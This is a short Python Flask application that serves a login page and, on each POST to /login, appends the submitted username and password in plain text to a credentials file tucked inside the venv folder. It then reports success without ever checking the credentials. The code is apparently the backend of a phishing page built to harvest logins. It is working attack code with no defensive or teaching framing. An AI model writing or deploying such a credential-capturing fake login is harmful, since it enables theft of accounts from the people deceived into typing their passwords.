from flask import Flask, render_template, request, jsonify
import os

app = Flask(__name__)

# Ensure the venv directory exists for storing credentials (it should, but just in case)
CREDENTIALS_FILE = os.path.join(os.getcwd(), 'venv', 'credentials.txt')

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if username and password:
        # Append credentials to the file in the venv folder
        try:
            with open(CREDENTIALS_FILE, 'a') as f:
                # Format: Username: <user> | Password: <pass>
                f.write(f"Username: {username} | Password: {password}\n")
        except Exception as e:
            print(f"Error saving credentials: {e}")
            return jsonify({"status": "error", "message": "Server error"}), 500
            
        # Return success even if we just saved it, to show the popup
        return jsonify({"status": "success"})
    
    return jsonify({"status": "error", "message": "Missing credentials"}), 400

if __name__ == '__main__':
    app.run(debug=True, port=5000)
